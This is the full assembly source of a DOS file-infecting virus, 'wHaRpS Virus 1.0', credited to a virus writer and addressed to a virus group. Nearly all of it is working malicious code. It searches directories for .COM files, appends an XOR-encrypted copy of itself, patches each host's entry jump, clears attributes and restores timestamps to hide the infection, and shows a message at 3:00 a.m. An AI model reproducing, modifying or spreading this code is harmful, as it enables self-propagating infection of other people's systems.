; "One must crawl before one walks." 
;                              wHaRpS Virus 1.0
; wHaRpS virus of independent virus writer FirstStrike
; For use by [Phalcon\Skism] ONLY!
; Special thanx to:
;               Gheap
;               Dark Angel
;               Demogorgon


name    wHaRpS
        title   
code    segment
        assume  cs:code,ds:code
        org     100h


dta     equ     65000d                  ; DTA address to be set
fname   equ     65000d + 1eh            ; DTA - file name      
ftime   equ     65000d + 16h            ; DTA - file time      
fsize   equ     65000d + 1ah            ; DTA - file size      
orgdir  equ     65400d                  ; original path storage
date    equ     65300d                  ; store file date
time    equ     65302d                  ; store file time
attrib  equ     65304d                  ; store file attrib
err1    equ     65306d                  ; old error handler address
err2    equ     65308d                  ; old error handler address

olddta  equ     80h                     ; original DTA address      

        

begin:
        nop
        nop
        nop
        call    setup                   ; find "delta offset"
setup:               
        pop     bp                              
        sub     bp, offset setup
        jmp     main                    ; DEBUG E8 02 00
        nop
        jmp     main

crypt_em:  
        xor        di,di
        lea        si, [bp+main]      
        mov        di, si
        mov        cx, end_crypt - main

xor_loop:
        lodsb                           ; ds:[si] -> al
        db      34h                     ; xor al, XX
encrypt_val db 0                        ; Starting encryption value is 0
        stosb                           ; al ->es:[di]
        loop    xor_loop
        ret

main:
        xor     di,di
        mov     di,0100h                ; Restore first three      
        lea     si,[bp+saveins]         ;  original program bytes
        mov     cx,0003d
        rep     movsb
        jmp     system_pic              ; Take a "picture" of system settings

handler:                                ; error handler
        mov     al,0
        iret
endp


data    label   byte
wharps    db    '[wHaRpS]',0            ; wHaRpS ID
author    db    'FŒrsØStrŒkä',0         ; Me
dir_mask  db    '*.',0                  ; dir atrib
allcom    db    '*.COM',0               ; what to search for
root      db    '\',0                   ; root
saveins   db    0e8h,00h,00h            ; original three bytes
ultimate  dw    0                       ; ultimate dir to be reached
current   dw    0                       ; current dir
message   db    'wHaRpS! It is 3:00 a.m. > ETERNAL $'

system_pic:                             ; SNAP!
        mov     ah,47h                  ; get original path
        mov     dl,0
        lea     si,cs:orgdir            ; store original path
        int     21h

crypt_change:                           ; set crypt value
        mov     ah,2ch
        int     21h
        mov     [bp+encrypt_val],dl
        cmp     ch,03
        jz      more
        jmp     errorh

more:
        cmp     cl,00
        jz      bomb
        jmp     errorh
        
bomb:
        mov     ah,09h
        lea     dx,[bp+message]
        int     21h
        mov     ah,4ch
        int     21h

errorh:                                 
        push    es                      ; save original error handler address
        mov     ax,3524h                      
        int     21h                           
        mov     word ptr cs:err1,bx
        mov     word ptr cs:err2,es
        pop     es                            

        mov     ax,2524h                ; set an error handler       
        lea     dx, [bp+offset handler] ;  no more Retry,Abort,Fail deals            
        int     21h
        jmp     pre_search

drop_to_root:                           ; subroutine to visit the root
        lea     dx,[bp+root]
        jmp     continue

set_path:                               ; OR set a path
        lea     dx,cs:fname
        
continue:
        mov     ah,3bh
        int     21h
        ret
       
return_to_search:
        inc     [bp+ultimate]           
        call    drop_to_root
        mov     [bp+current],0000
        jmp     find_first_dir


pre_search:                             ; set a DTA
        mov     dx,dta
        mov     ah,1ah
        int     21h
        
        mov     [bp+current],0000       ; zero the counters
        mov     [bp+ultimate],0000      ; ""
        inc     [bp+ultimate]           ; want to search 1st dir in root
        call    drop_to_root            ; bomb to root

find_first_dir:                         ; directory searchin'
        lea     dx,[bp+dir_mask]              
        mov     cx,16
        mov     ah,4Eh                       
        int     21h
        jc      almost_done             ; no directories?        
        
dir_test:
        inc     [bp+current]            ; directory found - MARK!
        mov     bx,[bp+current]         
        cmp     word ptr [bp+ultimate],bx ; is it the one we want?
        jnz     find_next_dir           ; no, find another
        call    set_path                ; yes, set the correct path
        jmp     find_first_file         ; find some .COMs



find_next_dir:                          ; mo' directory searchin'
        mov     ah,4fh                         
        int     21h
        jc      almost_done
        jmp     dir_test                ; go see if correct dir found yet
     


find_first_file:                        ; file searchin'
        lea     dx,[bp+allcom]              
        mov     cx,00000001b                  
        mov     ah,4Eh                         
        int     21h
        jc      return_to_search        ; no .COM so mo' dir              
        jmp     check_if_ill            ; is the file "sick"?



find_next_file:                         ; keep on a searchin'
        mov     ah,4fh                       
        int     21h
        jc      return_to_search        ; no more .COM so back 
                                        ;  to the directories

check_if_ill:                           ; check file's health
        mov     ax,cs:ftime
        and     al,11111b               ; good, your sick!      
        cmp     al,62d/2                ; (No more 62 seconds as virus       
        jz      find_next_file          ;  markers! - I swear!)

        cmp     cs:fsize,60000d         ; whoa, file to big!    
        ja      find_next_file          ; so, get a new one     

        cmp     cs:fsize,500d           ; whoa, file to small!    
        jb      find_next_file          ; throw it back and move on          
        jmp     infect                  ; perfect, for infection

        db      'Joy J.',0              ; don't ask

error:
pre_done:
almost_done:
        jmp     done                    ; in case of emergency.....

infect:
        mov     ah,43h                  ; save original attribute
        mov     al,00h
        lea     dx,cs:[fname]
        int     21h
        mov     cs:attrib,cx
        jc      pre_done

        mov     ax,4301h                ; clear all attributes       
        and     cx,11111110b            ;  (none shall slow progress)
        int     21h
        jc      pre_done

        
        mov     ax,3d02h                ; open the file, please      
        int     21h
        jc      pre_done
        xchg    bx,ax
        
        

        mov     ax,5700h                ; save the date/time      
        int     21h
        mov     cs:time,cx                  
        mov     cs:date,dx
        jc      pre_done


        mov     ah,3Fh                  ; read first 3 bytes of file 
        mov     cx,0003h                ;  to be infected and save
        lea     dx,[bp+saveins] 
        int     21h
        jc      pre_done        

        mov     ax,4202h                ; move to end of file
        xor     cx,cx           
        xor     dx,dx
        int     21h
        jc      pre_done        
        mov     [bp+new_jmp],ax

        call    crypt_em                 

end_crypt       label     byte          ; encrypt to here

        mov     ah,40h                  
        mov     cx,endcode-begin        
        lea     dx,[bp+begin]           
        int     21h                     ; encrypt n' write virus to end of 
        jc      done                    ;  file

        mov     ax,4200h                ; go to beginning of file
        xor     cx,cx         
        xor     dx,dx
        int     21h
        jc      done
        jmp     cont

jmpc      db    0e9h
new_jmp   dw    ?

cont:
        mov     ah,40h        
        mov     cl,3           
        lea     dx,[bp+jmpc] 
        int     21h
        jc      done

attrib_stuff:                  

        mov     ax,5701h       
        mov     cx,cs:[time]
        mov     dx,cs:[date]
        or      cl,11111b      
        int     21h
        jc      done

        mov     ah,3eh
        int     21h
        jc      done

        mov     ax,4301h
        mov     cx,cs:[attrib]
        lea     dx,cs:[fname]
        int     21h
        jc      done

done:
        mov     dx,olddta               ; restore all changes
        mov     ah,1ah
        int     21h

        push    ds             
        mov     ax,2524h       
        lea     dx,cs:[err2]
        mov     ds,dx
        lea     dx,cs:[err1]
        int     21h
        pop     ds             
        
        mov     ah,3bh
        mov     dx,'/'
        int     21h

        mov     ah,3bh
        lea     dx,cs:[orgdir]
        int     21h

        xor     di,di
        mov     di,0100h                    
        jmp     di                      ; good_bye




endcode         label     byte                              




code      ends
end       begin
  
  
